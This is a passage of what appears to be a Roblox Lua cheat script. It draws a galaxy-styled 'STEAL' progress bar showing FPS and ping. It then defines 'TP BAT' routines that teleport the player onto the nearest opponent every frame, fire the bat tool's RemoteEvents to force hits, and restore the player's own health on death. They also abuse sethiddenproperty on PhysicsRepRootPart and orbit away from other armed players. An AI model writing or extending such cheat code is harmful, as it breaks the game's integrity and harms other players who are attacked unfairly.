        sbStroke.Transparency=0.3

        task.defer(function()
            pcall(function()
                local outer = GuiRefs and GuiRefs.outer
                if outer and outer.Parent then
                    local abs = outer.AbsolutePosition
                    local asz = outer.AbsoluteSize
                    local x = abs.X + asz.X + 12
                    local y = abs.Y + asz.Y * 0.5 - SB_H * 0.5
                    stealBarFrame.Position = UDim2.new(0, math.floor(x), 0, math.floor(y))
                end
            end)
        end)

        local galaxyLayer=Instance.new("Frame",stealBarFrame)
        galaxyLayer.Name="Galaxy"
        galaxyLayer.Size=UDim2.new(1,0,1,0)
        galaxyLayer.BackgroundTransparency=1
        galaxyLayer.BorderSizePixel=0
        galaxyLayer.ZIndex=20
        galaxyLayer.ClipsDescendants=true
        Instance.new("UICorner",galaxyLayer).CornerRadius=UDim.new(0, math.floor(18*sc+0.5))
        local neb1=Instance.new("Frame",galaxyLayer)
        neb1.Size=UDim2.new(1.2,0,0.55,0); neb1.Position=UDim2.new(-0.1,0,-0.05,0)
        neb1.BackgroundColor3=Color3.fromRGB(90,40,180); neb1.BackgroundTransparency=0.82
        neb1.BorderSizePixel=0; neb1.ZIndex=20
        Instance.new("UICorner",neb1).CornerRadius=UDim.new(1,0)
        local neb2=Instance.new("Frame",galaxyLayer)
        neb2.Size=UDim2.new(1.2,0,0.5,0); neb2.Position=UDim2.new(-0.1,0,0.55,0)
        neb2.BackgroundColor3=Color3.fromRGB(40,80,200); neb2.BackgroundTransparency=0.85
        neb2.BorderSizePixel=0; neb2.ZIndex=20
        Instance.new("UICorner",neb2).CornerRadius=UDim.new(1,0)
        local rng=Random.new()
        for i=1,18 do
            local star=Instance.new("Frame",galaxyLayer)
            local sz=rng:NextInteger(1,2)
            star.Size=UDim2.new(0,sz,0,sz)
            star.Position=UDim2.new(rng:NextNumber(0.1,0.9),0,rng:NextNumber(0.08,0.92),0)
            star.BackgroundColor3=Color3.fromRGB(220+rng:NextInteger(0,35),210+rng:NextInteger(0,40),255)
            star.BackgroundTransparency=rng:NextNumber(0.15,0.55)
            star.BorderSizePixel=0; star.ZIndex=21
            Instance.new("UICorner",star).CornerRadius=UDim.new(1,0)
            task.spawn(function()
                while star and star.Parent do
                    local t=TweenService:Create(star,TweenInfo.new(rng:NextNumber(0.8,2.2),Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{
                        BackgroundTransparency=rng:NextNumber(0.05,0.7)
                    })
                    t:Play(); t.Completed:Wait()
                end
            end)
        end

        local avRing=Instance.new("Frame",stealBarFrame)
        avRing.Size=UDim2.new(0,AV_SIZE,0,AV_SIZE)
        avRing.Position=UDim2.new(0.5,-AV_SIZE/2,0, math.floor(8*sc+0.5))
        avRing.BackgroundColor3=Color3.fromRGB(30,20,28)
        avRing.BorderSizePixel=0; avRing.ZIndex=28
        Instance.new("UICorner",avRing).CornerRadius=UDim.new(1,0)
        local avStroke=Instance.new("UIStroke",avRing)
        avStroke.Color=WHITE; avStroke.Thickness=1.2; avStroke.Transparency=0.35
        local avImg=Instance.new("ImageLabel",avRing)
        avImg.Size=UDim2.new(1,-2,1,-2); avImg.Position=UDim2.new(0,1,0,1)
        avImg.BackgroundTransparency=1; avImg.BorderSizePixel=0; avImg.ZIndex=29
        avImg.ScaleType=Enum.ScaleType.Crop
        avImg.Image="rbxthumb://type=AvatarHeadShot&id="..tostring(LP.UserId).."&w=150&h=150"
        Instance.new("UICorner",avImg).CornerRadius=UDim.new(1,0)

        pctLbl=Instance.new("TextLabel",stealBarFrame)
        pctLbl.Size=UDim2.new(1,-6,0, math.floor(18*sc+0.5))
        pctLbl.Position=UDim2.new(0,3,0, math.floor(8*sc+0.5)+AV_SIZE+2)
        pctLbl.BackgroundTransparency=1
        pctLbl.Text="0%"
        pctLbl.TextColor3=WHITE
        pctLbl.Font=Enum.Font.GothamBlack
        pctLbl.TextSize=math.max(11, math.floor(13*sc+0.5))
        pctLbl.ZIndex=26

        local nameLbl=Instance.new("TextLabel",stealBarFrame)
        nameLbl.Size=UDim2.new(1,-6,0, math.floor(12*sc+0.5))
        nameLbl.Position=UDim2.new(0,3,0, math.floor(8*sc+0.5)+AV_SIZE+math.floor(18*sc+0.5))
        nameLbl.BackgroundTransparency=1
        nameLbl.Text="STEAL"
        nameLbl.TextColor3=WHITE
        nameLbl.Font=Enum.Font.GothamBold
        nameLbl.TextSize=math.max(8, math.floor(9*sc+0.5))
        nameLbl.ZIndex=26

        local topContent = math.floor(8*sc+0.5)+AV_SIZE+math.floor(32*sc+0.5)
        local botContent = math.floor(34*sc+0.5)
        local track=Instance.new("Frame",stealBarFrame)
        track.Size=UDim2.new(0, math.floor(14*sc+0.5), 1, -(topContent + botContent))
        track.Position=UDim2.new(0.5, -math.floor(7*sc+0.5), 0, topContent)
        track.BackgroundColor3=Color3.fromRGB(30,18,26)
        track.BorderSizePixel=0
        track.ZIndex=21
        track.ClipsDescendants=true
        Instance.new("UICorner",track).CornerRadius=UDim.new(1,0)
        local trackStroke=Instance.new("UIStroke",track)
        trackStroke.Color=WHITE; trackStroke.Thickness=1; trackStroke.Transparency=0.55

        fillLine=Instance.new("Frame",track)
        fillLine.AnchorPoint=Vector2.new(0,1)
        fillLine.Size=UDim2.new(1,0,0,0)
        fillLine.Position=UDim2.new(0,0,1,0)
        fillLine.BackgroundColor3=WHITE
        fillLine.BorderSizePixel=0
        fillLine.ZIndex=22
        Instance.new("UICorner",fillLine).CornerRadius=UDim.new(1,0)
        fillGrad=Instance.new("UIGradient",fillLine)
        fillGrad.Rotation=90
        fillGrad.Color=ColorSequence.new({
            ColorSequenceKeypoint.new(0,Color3.fromRGB(200,200,200)),
            ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(1,Color3.fromRGB(200,200,200)),
        })

        fpsLbl=Instance.new("TextLabel",stealBarFrame)
        fpsLbl.Size=UDim2.new(1,-6,0, math.floor(12*sc+0.5))
        fpsLbl.Position=UDim2.new(0,3,1, -math.floor(28*sc+0.5))
        fpsLbl.BackgroundTransparency=1
        fpsLbl.Text="--"
        fpsLbl.TextColor3=WHITE
        fpsLbl.Font=Enum.Font.GothamBold
        fpsLbl.TextSize=math.max(8, math.floor(9*sc+0.5))
        fpsLbl.ZIndex=26

        pingLbl=Instance.new("TextLabel",stealBarFrame)
        pingLbl.Size=UDim2.new(1,-6,0, math.floor(12*sc+0.5))
        pingLbl.Position=UDim2.new(0,3,1, -math.floor(14*sc+0.5))
        pingLbl.BackgroundTransparency=1
        pingLbl.Text="--"
        pingLbl.TextColor3=WHITE
        pingLbl.Font=Enum.Font.GothamBold
        pingLbl.TextSize=math.max(8, math.floor(9*sc+0.5))
        pingLbl.ZIndex=26

        warnFrame=Instance.new("Frame",stealGui)
        warnFrame.Size=UDim2.new(0, math.floor(140*sc+0.5), 0, math.floor(18*sc+0.5))
        warnFrame.Position=UDim2.new(0, 300, 0.5, -SB_H/2 - math.floor(24*sc+0.5))
        warnFrame.BackgroundColor3=Color3.fromRGB(40,10,10)
        warnFrame.BackgroundTransparency=0.15
        warnFrame.BorderSizePixel=0
        warnFrame.Visible=false
        warnFrame.ZIndex=25
        Instance.new("UICorner",warnFrame).CornerRadius=UDim.new(1,0)
        warnLbl=Instance.new("TextLabel",warnFrame)
        warnLbl.Size=UDim2.new(1,0,1,0)
        warnLbl.BackgroundTransparency=1
        warnLbl.Text=""
        warnLbl.TextColor3=Color3.fromRGB(255,120,120)
        warnLbl.Font=Enum.Font.GothamBold
        warnLbl.TextSize=math.max(8, math.floor(9*sc+0.5))
        warnLbl.ZIndex=26

        task.spawn(function()
            local frames=0; local t0=tick()
            while fpsLbl and fpsLbl.Parent do
                frames=frames+1; local now=tick()
                if now-t0>=0.5 then
                    local fps=math.floor(frames/(now-t0)+0.5)
                    fpsLbl.Text=tostring(fps).." fps"
                    frames=0; t0=now
                end
                task.wait()
            end
        end)
        task.spawn(function()
            while pingLbl and pingLbl.Parent do
                pcall(function()
                    local ping=math.floor((game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())+0.5)
                    local pingColor=WHITE
                    if ping<80 then pingColor=Color3.fromRGB(0,255,120)
                    elseif ping<150 then pingColor=Color3.fromRGB(255,200,0)
                    else pingColor=Color3.fromRGB(255,60,60) end
                    pingLbl.Text=tostring(ping).." ms"
                    pingLbl.TextColor3=pingColor
                    if ping >= 150 then
                        warnLbl.Text = "HIGH PING "..tostring(ping)
                        warnFrame.Visible = true
                        if stealBarFrame then
                            warnFrame.Position = UDim2.new(
                                stealBarFrame.Position.X.Scale,
                                stealBarFrame.Position.X.Offset,
                                stealBarFrame.Position.Y.Scale,
                                stealBarFrame.Position.Y.Offset - math.floor(22*sc+0.5)
                            )
                        end
                    else
                        warnFrame.Visible = false
                    end
                end)
                task.wait(0.5)
            end
        end)

        stealBarFrame:SetAttribute("StealStyle", 1)
    else
        -- ========== STYLE 2: current full bar (scalable) ==========
        local sc = math.clamp(tonumber(stealBarScale) or 1, 0.7, 1.8)
        local SB_W,SB_H=math.floor(360*sc+0.5), math.floor(40*sc+0.5)
        local AV_SIZE=math.floor(32*sc+0.5)
        stealBarFrame=Instance.new("Frame",stealGui)
        stealBarFrame.Size=UDim2.new(0,SB_W,0,SB_H); stealBarFrame.Position=UDim2.new(0.5,-SB_W/2,0.88,0)
        stealBarFrame.BackgroundColor3=BARBG; stealBarFrame.BorderSizePixel=0; stealBarFrame.ZIndex=20; stealBarFrame.ClipsDescendants=true
        stealBarFrame.Visible=true
        stealBarFrame.Active=true
        Instance.new("UICorner",stealBarFrame).CornerRadius=UDim.new(1,0)
        local sbStroke=Instance.new("UIStroke",stealBarFrame); sbStroke.Color=WHITE; sbStroke.Thickness=2; sbStroke.Transparency=0.3
        local galaxyLayer=Instance.new("Frame",stealBarFrame)
        galaxyLayer.Name="Galaxy"
        galaxyLayer.Size=UDim2.new(1,0,1,0)
        galaxyLayer.BackgroundTransparency=1
        galaxyLayer.BorderSizePixel=0
        galaxyLayer.ZIndex=20
        galaxyLayer.ClipsDescendants=true
        Instance.new("UICorner",galaxyLayer).CornerRadius=UDim.new(1,0)
        local neb1=Instance.new("Frame",galaxyLayer)
        neb1.Size=UDim2.new(0.55,0,1.4,0); neb1.Position=UDim2.new(-0.05,0,-0.2,0)
        neb1.BackgroundColor3=Color3.fromRGB(90,40,180); neb1.BackgroundTransparency=0.82
        neb1.BorderSizePixel=0; neb1.ZIndex=20
        Instance.new("UICorner",neb1).CornerRadius=UDim.new(1,0)
        local neb2=Instance.new("Frame",galaxyLayer)
        neb2.Size=UDim2.new(0.5,0,1.3,0); neb2.Position=UDim2.new(0.55,0,-0.15,0)
        neb2.BackgroundColor3=Color3.fromRGB(40,80,200); neb2.BackgroundTransparency=0.85
        neb2.BorderSizePixel=0; neb2.ZIndex=20
        Instance.new("UICorner",neb2).CornerRadius=UDim.new(1,0)
        local rng=Random.new()
        for i=1,28 do
            local star=Instance.new("Frame",galaxyLayer)
            local sz=rng:NextInteger(1,2)
            star.Size=UDim2.new(0,sz,0,sz)
            star.Position=UDim2.new(rng:NextNumber(0.02,0.98),0,rng:NextNumber(0.1,0.9),0)
            star.BackgroundColor3=Color3.fromRGB(220+rng:NextInteger(0,35),210+rng:NextInteger(0,40),255)
            star.BackgroundTransparency=rng:NextNumber(0.15,0.55)
            star.BorderSizePixel=0; star.ZIndex=21
            Instance.new("UICorner",star).CornerRadius=UDim.new(1,0)
            task.spawn(function()
                while star and star.Parent do
                    local t=TweenService:Create(star,TweenInfo.new(rng:NextNumber(0.8,2.2),Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{
                        BackgroundTransparency=rng:NextNumber(0.05,0.7)
                    })
                    t:Play(); t.Completed:Wait()
                end
            end)
        end
        task.spawn(function()
            while galaxyLayer and galaxyLayer.Parent do
                task.wait(rng:NextNumber(2.2,4.5))
                local ss=Instance.new("Frame",galaxyLayer)
                ss.BackgroundColor3=Color3.fromRGB(210,190,255)
                ss.Size=UDim2.new(0,rng:NextInteger(18,36),0,1)
                ss.Position=UDim2.new(rng:NextNumber(0,0.5),0,rng:NextNumber(0.15,0.75),0)
                ss.Rotation=-18; ss.BackgroundTransparency=0.1; ss.BorderSizePixel=0; ss.ZIndex=22
                Instance.new("UICorner",ss).CornerRadius=UDim.new(1,0)
                TweenService:Create(ss,TweenInfo.new(0.45,Enum.EasingStyle.Linear),{
                    Position=UDim2.new(ss.Position.X.Scale+0.35,0,ss.Position.Y.Scale+0.2,0),
                    BackgroundTransparency=1
                }):Play()
                task.delay(0.5,function() if ss then ss:Destroy() end end)
            end
        end)
        local avRing=Instance.new("Frame",stealBarFrame)
        avRing.Size=UDim2.new(0,AV_SIZE,0,AV_SIZE)
        avRing.Position=UDim2.new(0,4,0.5,-AV_SIZE/2)
        avRing.BackgroundColor3=Color3.fromRGB(30,20,28)
        avRing.BorderSizePixel=0; avRing.ZIndex=28
        Instance.new("UICorner",avRing).CornerRadius=UDim.new(1,0)
        local avImg=Instance.new("ImageLabel",avRing)
        avImg.Size=UDim2.new(1,-2,1,-2); avImg.Position=UDim2.new(0,1,0,1)
        avImg.BackgroundTransparency=1; avImg.BorderSizePixel=0; avImg.ZIndex=29
        avImg.ScaleType=Enum.ScaleType.Crop
        avImg.Image="rbxthumb://type=AvatarHeadShot&id="..tostring(LP.UserId).."&w=150&h=150"
        Instance.new("UICorner",avImg).CornerRadius=UDim.new(1,0)

        fillLine=Instance.new("Frame",stealBarFrame); fillLine.Size=UDim2.new(0,0,1,0)
        fillLine.BackgroundColor3=WHITE; fillLine.BorderSizePixel=0; fillLine.ZIndex=21
        Instance.new("UICorner",fillLine).CornerRadius=UDim.new(1,0)
        fillGrad=Instance.new("UIGradient",fillLine)
        fillGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(200,200,200)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(200,200,200))})
        local leftPad=AV_SIZE+12
        local stealSection=Instance.new("Frame",stealBarFrame)
        stealSection.Size=UDim2.new(0,110,1,0); stealSection.Position=UDim2.new(0,leftPad,0,0); stealSection.BackgroundTransparency=1; stealSection.ZIndex=25
        local stealLbl=Instance.new("TextLabel",stealSection)
        stealLbl.Size=UDim2.new(0,55,1,0); stealLbl.Position=UDim2.new(0,0,0,0); stealLbl.BackgroundTransparency=1
        stealLbl.Text="STEAL"; stealLbl.TextColor3=WHITE; stealLbl.Font=Enum.Font.GothamBlack; stealLbl.TextSize=12
        stealLbl.TextXAlignment=Enum.TextXAlignment.Left; stealLbl.ZIndex=26
        stealBarFrame:SetAttribute("StealStyle", 2)
        pctLbl=Instance.new("TextLabel",stealSection)
        pctLbl.Size=UDim2.new(0,50,1,0); pctLbl.Position=UDim2.new(0,55,0,0); pctLbl.BackgroundTransparency=1
        pctLbl.Text="0%"; pctLbl.TextColor3=WHITE; pctLbl.Font=Enum.Font.GothamBlack; pctLbl.TextSize=12
        pctLbl.TextXAlignment=Enum.TextXAlignment.Left; pctLbl.ZIndex=26
        local div1=Instance.new("Frame",stealBarFrame)
        div1.Size=UDim2.new(0,1,0,SB_H*0.45); div1.Position=UDim2.new(0,leftPad+110,0.5,-(SB_H*0.45)/2)
        div1.BackgroundColor3=WHITE; div1.BackgroundTransparency=0.6; div1.BorderSizePixel=0; div1.ZIndex=25
        fpsLbl=Instance.new("TextLabel",stealBarFrame)
        fpsLbl.Size=UDim2.new(0,68,1,0); fpsLbl.Position=UDim2.new(0,leftPad+118,0,0); fpsLbl.BackgroundTransparency=1
        fpsLbl.Text="FPS: --"; fpsLbl.TextColor3=WHITE; fpsLbl.Font=Enum.Font.GothamBold; fpsLbl.TextSize=10
        fpsLbl.TextXAlignment=Enum.TextXAlignment.Left; fpsLbl.ZIndex=26
        task.spawn(function()
            local frames=0; local t0=tick()
            while fpsLbl and fpsLbl.Parent do
                frames=frames+1; local now=tick()
                if now-t0>=0.5 then
                    local fps=math.floor(frames/(now-t0)+0.5); fpsLbl.Text="FPS: "..tostring(fps); frames=0; t0=now
                end
                task.wait()
            end
        end)
        local div2=Instance.new("Frame",stealBarFrame)
        div2.Size=UDim2.new(0,1,0,SB_H*0.45); div2.Position=UDim2.new(0,leftPad+190,0.5,-(SB_H*0.45)/2)
        div2.BackgroundColor3=WHITE; div2.BackgroundTransparency=0.6; div2.BorderSizePixel=0; div2.ZIndex=25
        pingLbl=Instance.new("TextLabel",stealBarFrame)
        pingLbl.Size=UDim2.new(0,90,1,0); pingLbl.Position=UDim2.new(0,leftPad+198,0,0); pingLbl.BackgroundTransparency=1
        pingLbl.Text="PING: --"; pingLbl.TextColor3=WHITE; pingLbl.Font=Enum.Font.GothamBold; pingLbl.TextSize=10
        pingLbl.TextXAlignment=Enum.TextXAlignment.Left; pingLbl.ZIndex=26

        warnFrame=Instance.new("Frame",stealGui)
        warnFrame.Size=UDim2.new(0,280,0,24)
        warnFrame.Position=UDim2.new(0.5,-140,0.88,-30)
        warnFrame.BackgroundColor3=Color3.fromRGB(50,10,10)
        warnFrame.BackgroundTransparency=0.15
        warnFrame.BorderSizePixel=0
        warnFrame.Visible=false
        warnFrame.ZIndex=30
        Instance.new("UICorner",warnFrame).CornerRadius=UDim.new(1,0)
        warnLbl=Instance.new("TextLabel",warnFrame)
        warnLbl.Size=UDim2.new(1,-8,1,0)
        warnLbl.Position=UDim2.new(0,4,0,0)
        warnLbl.BackgroundTransparency=1
        warnLbl.Text=""
        warnLbl.TextColor3=Color3.fromRGB(255,120,120)
        warnLbl.Font=Enum.Font.GothamBold
        warnLbl.TextSize=11
        warnLbl.ZIndex=31

        task.spawn(function()
            while pingLbl and pingLbl.Parent do
                pcall(function()
                    local ping=math.floor((game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())+0.5)
                    local pingColor=WHITE
                    if ping<80 then pingColor=Color3.fromRGB(0,255,120)
                    elseif ping<150 then pingColor=Color3.fromRGB(255,200,0)
                    else pingColor=Color3.fromRGB(255,60,60) end
                    pingLbl.Text="PING: "..tostring(ping).."ms"; pingLbl.TextColor3=pingColor
                    if ping >= 150 then
                        warnLbl.Text = "WARNING: HIGH PING  ·  "..tostring(ping).."ms"
                        warnFrame.Visible = true
                        warnFrame.Active = true
                    else
                        warnFrame.Visible = false
                        warnFrame.Active = false
                    end
                end)
                task.wait(0.5)
            end
        end)
    end

    -- shared fill update (horizontal style2 / vertical style1)
    task.spawn(function()
        while fillLine and fillLine.Parent do
            local now=tick()
            if stealBarFrame then
                stealBarFrame.Visible = true
                stealBarFrame.Active = true
            end
            local isVert = stealBarFrame and stealBarFrame:GetAttribute("StealStyle") == 1
            if Steal.AutoStealEnabled then
                local pct = tonumber(stealVisualPct) or 0
                if isVert then
                    fillLine.Size=UDim2.new(1,0,pct,0) -- vertical grow
                else
                    fillLine.Size=UDim2.new(pct,0,1,0) -- horizontal grow
                end
                if fillGrad then fillGrad.Offset=Vector2.new(math.sin(now*3)*0.5,0) end
                if pctLbl then pctLbl.Text=math.floor(pct*100).."%" end
            else
                if isVert then
                    fillLine.Size=UDim2.new(1,0,0,0)
                else
                    fillLine.Size=UDim2.new(0,0,1,0)
                end
                if pctLbl then pctLbl.Text="0%" end
            end
            task.wait(0.016)
        end
    end)

    -- drag
    local dragStart2,dragStartPos2,dragging2=nil,nil,false
    stealBarFrame.InputBegan:Connect(function(input)
        if uiLocked then return end
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            dragging2=true; dragStart2=input.Position; dragStartPos2=stealBarFrame.Position
            input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging2=false end end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if uiLocked then dragging2=false; return end
        if dragging2 and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
            local delta=input.Position-dragStart2
            stealBarFrame.Position=UDim2.new(dragStartPos2.X.Scale,dragStartPos2.X.Offset+delta.X,dragStartPos2.Y.Scale,dragStartPos2.Y.Offset+delta.Y)
        end
    end)
end

createStealBar()

-- ============================================================
-- TP BAT + BAT V2
-- ============================================================
local RXZ_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
function RXZ.findBat()
    local char=LP.Character; if not char then return nil end
    for _,name in ipairs(RXZ_SLAP_LIST) do local t=char:FindFirstChild(name); if t and t:IsA("Tool") then return t end end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _,name in ipairs(RXZ_SLAP_LIST) do
            local t=bp:FindFirstChild(name)
            if t and t:IsA("Tool") then
                local hum=char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(t) end) end
                return t
            end
        end
    end
    for _,ch in ipairs(char:GetChildren()) do if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then return ch end end
    return nil
end
function RXZ.closestRoot()
    local char=LP.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
    if not root then return nil,math.huge end
    local best,dist=nil,math.huge
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LP and p.Character then
            local tr=p.Character:FindFirstChild("HumanoidRootPart"); local hum=p.Character:FindFirstChildOfClass("Humanoid")
            if tr and hum and hum.Health>0 then
                local d=(tr.Position-root.Position).Magnitude
                if d<dist then dist=d; best=tr end
            end
        end
    end
    return best,dist
end
function RXZ.tpHit()
    if RXZ.hitCD then return end
    RXZ.hitCD=true
    pcall(function()
        local char=LP.Character
        if not char then return end
        local hum=char:FindFirstChildOfClass("Humanoid")
        local bat=RXZ.findBat()
        if not bat then return end
        if bat.Parent~=char and hum then pcall(function() hum:EquipTool(bat) end) end
        -- multi-activate for reliable hits
        for _=1,3 do
            pcall(function() bat:Activate() end)
            local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then pcall(function() ev:FireServer() end) end
            for _,d in ipairs(bat:GetDescendants()) do
                if d:IsA("RemoteEvent") then pcall(function() d:FireServer() end) end
            end
        end
        task.defer(function()
            if bat and bat.Parent then
                pcall(function() bat:Activate() end)
                local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
        end)
    end)
    task.delay(0.03,function() RXZ.hitCD=false end)
end

function RXZ_forceAimbotOff()
    autoBatEnabled=false
    if aimbotConn then pcall(function() aimbotConn:Disconnect() end); aimbotConn=nil end
    if stopBatAimbot then pcall(stopBatAimbot) end
    autoBatEnabled=false
    pcall(function()
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        if GuiToggleSetters and GuiToggleSetters.circle then GuiToggleSetters.circle(false) end
    end)
end

function RXZ.startTPBat()
    RXZ_forceAimbotOff()
    if RXZ.tpConn then pcall(function() RXZ.tpConn:Disconnect() end); RXZ.tpConn=nil end
    if RXZ._tpShieldConn then pcall(function() RXZ._tpShieldConn:Disconnect() end); RXZ._tpShieldConn=nil end
    if RXZ._tpAntiDieConn then pcall(function() RXZ._tpAntiDieConn:Disconnect() end); RXZ._tpAntiDieConn=nil end
    if RXZ._tpCharConn then pcall(function() RXZ._tpCharConn:Disconnect() end); RXZ._tpCharConn=nil end
    if RXZ._tpPatchConn then pcall(function() RXZ._tpPatchConn:Disconnect() end); RXZ._tpPatchConn=nil end
    RXZ.tpBat=true
    RXZ._tpHitDone=false
    RXZ._tpTargetHealth=nil
    RXZ._tpTargetHum=nil

    local function finishAndOff()
        if RXZ._tpHitDone then return end
        RXZ._tpHitDone=true
        RXZ.stopTPBat()
        pcall(function()
            if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
            if mobBtnRefs and mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
        end)
    end

    -- ===== ANTI DIE (Polo system) while anti desync is on =====
    local function bindAntiDie(char)
        if RXZ._tpAntiDieConn then pcall(function() RXZ._tpAntiDieConn:Disconnect() end) end
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 3)
        if not hum then return end
        RXZ._tpAntiDieConn = hum.HealthChanged:Connect(function(newHealth)
            if not RXZ.tpBat then return end
            if newHealth <= 0 then
                pcall(function()
                    hum.Health = hum.MaxHealth
                end)
            end
        end)
    end
    bindAntiDie(LP.Character)
    RXZ._tpCharConn = LP.CharacterAdded:Connect(function(c)
        if not RXZ.tpBat then return end
        task.wait(0.1)
        bindAntiDie(c)
    end)

    -- ===== ANTI DESYNC (TP bat) — original logic =====
    RXZ.tpConn=RunService.Heartbeat:Connect(function()
        if not RXZ.tpBat then return end
        local char=LP.Character; if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
        local hum=char:FindFirstChildOfClass("Humanoid")

        -- anti-die hard restore each frame too
        if hum and hum.Health <= 0 then
            pcall(function() hum.Health = hum.MaxHealth end)
        end

        -- lock preferred target (stick until dead/ragdoll)
        local tr=RXZ._tpLockedRoot
        if not tr or not tr.Parent or not tr.Parent.Parent then
            tr=RXZ.closestRoot()
            RXZ._tpLockedRoot=tr
        else
            local th=tr.Parent and tr.Parent:FindFirstChildOfClass("Humanoid")
            if not th or th.Health<=0 then
                tr=RXZ.closestRoot()
                RXZ._tpLockedRoot=tr
            end
        end
        if tr then
            if sethiddenproperty then pcall(function() sethiddenproperty(hrp,"PhysicsRepRootPart",tr) end) end
            local tVel=tr.AssemblyLinearVelocity or Vector3.zero
            -- predict short ahead so hits land on moving targets
            local pred=tr.Position+tVel*0.05+Vector3.new(0,0.35,0)
            -- stay glued inside hit range
            local offset=Vector3.new(0,0.2,0)
            local stick=pred+offset
            local lookFlat=Vector3.new(tVel.X,0,tVel.Z)
            if lookFlat.Magnitude<0.15 then
                lookFlat=Vector3.new(tr.Position.X-hrp.Position.X,0,tr.Position.Z-hrp.Position.Z)
            end
            if lookFlat.Magnitude>0.05 then
                hrp.CFrame=CFrame.lookAt(stick,stick+lookFlat.Unit)
            else
                hrp.CFrame=CFrame.new(stick)
            end
            if (hrp.Position-tr.Position).Magnitude>3.5 then
                hrp.CFrame=CFrame.lookAt(tr.Position+Vector3.new(0,0.4,0),tr.Position)
            end
            hrp.AssemblyLinearVelocity=tVel
            hrp.AssemblyAngularVelocity=Vector3.zero
            local cam=workspace.CurrentCamera
            if cam then cam.CFrame=CFrame.lookAt(cam.CFrame.Position,tr.Position+Vector3.new(0,1,0)) end
            RXZ.tpHit()
            -- extra swing burst when very close
            if (hrp.Position-tr.Position).Magnitude<4 then
                RXZ.tpHit()
            end

            local tHum=tr.Parent and tr.Parent:FindFirstChildOfClass("Humanoid")
            if tHum then
                if RXZ._tpTargetHum==tHum and RXZ._tpTargetHealth then
                    if tHum.PlatformStand or tHum.Health<RXZ._tpTargetHealth-0.5 then
                        finishAndOff()
                        return
                    end
                end
                RXZ._tpTargetHum=tHum
                RXZ._tpTargetHealth=tHum.Health
            end
        end
    end)

    -- Shield: orbit dodge vs other players with bat (not the locked target)
    RXZ._tpShieldConn=RunService.Heartbeat:Connect(function()
        if not RXZ.tpBat then return end
        local char=LP.Character
        local hrp=char and char:FindFirstChild("HumanoidRootPart")
        local hum=char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health<=0 then return end
        local lockRoot=RXZ.closestRoot()
        for _,player in ipairs(Players:GetPlayers()) do
            if player~=LP and player.Character then
                local enemyHrp=player.Character:FindFirstChild("HumanoidRootPart")
                local enemyTool=player.Character:FindFirstChildWhichIsA("Tool")
                if enemyHrp and enemyTool then
                    local n=enemyTool.Name:lower()
                    if n:find("bat") or n:find("slap") then
                        local distance=(hrp.Position-enemyHrp.Position).Magnitude
                        if distance<8 and enemyHrp~=lockRoot then
                            local angle=math.rad(tick()*500)
                            hrp.CFrame=hrp.CFrame*CFrame.new(math.sin(angle)*3,0,math.cos(angle)*3)
                        end
                    end
                end
            end
        end
    end)
end

function RXZ.stopTPBat()
    RXZ.tpBat=false
    RXZ._tpHitDone=false
    RXZ._tpTargetHealth=nil
    RXZ._tpTargetHum=nil
    RXZ._tpLockedRoot=nil
    if RXZ.tpConn then pcall(function() RXZ.tpConn:Disconnect() end); RXZ.tpConn=nil end
    if RXZ._tpShieldConn then pcall(function() RXZ._tpShieldConn:Disconnect() end); RXZ._tpShieldConn=nil end
    if RXZ._tpAntiDieConn then pcall(function() RXZ._tpAntiDieConn:Disconnect() end); RXZ._tpAntiDieConn=nil end
    if RXZ._tpCharConn then pcall(function() RXZ._tpCharConn:Disconnect() end); RXZ._tpCharConn=nil end
    if RXZ._tpPatchConn then pcall(function() RXZ._tpPatchConn:Disconnect() end); RXZ._tpPatchConn=nil end
    pcall(function()
        local cam=workspace.CurrentCamera
        if cam and cam.CameraType==Enum.CameraType.Scriptable then
            cam.CameraType=Enum.CameraType.Custom
        end
    end)
end

function RXZ.v2Swing()
    -- same pace as aimbot auto-swing
    local now=tick()
    if now-(batV2LastSwing or 0)<0.05 then return end
    batV2LastSwing=now
    RXZ.v2CD=true
    pcall(function()
        local c=LP.Character
        local h=c and c:FindFirstChildOfClass("Humanoid")
        local bat=RXZ.findBat()
        if not bat then return end
        if bat.Parent~=c and h then pcall(function() h:EquipTool(bat) end) end
        pcall(function() bat:Activate() end)
        local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
        if ev then pcall(function() ev:FireServer() end) end
        task.defer(function()
            if bat and bat.Parent then pcall(function() bat:Activate() end) end
        end)
    end)
    task.delay(0.05,function() RXZ.v2CD=false end)
end

function RXZ.stopBatV2()
    batV2Enabled=false
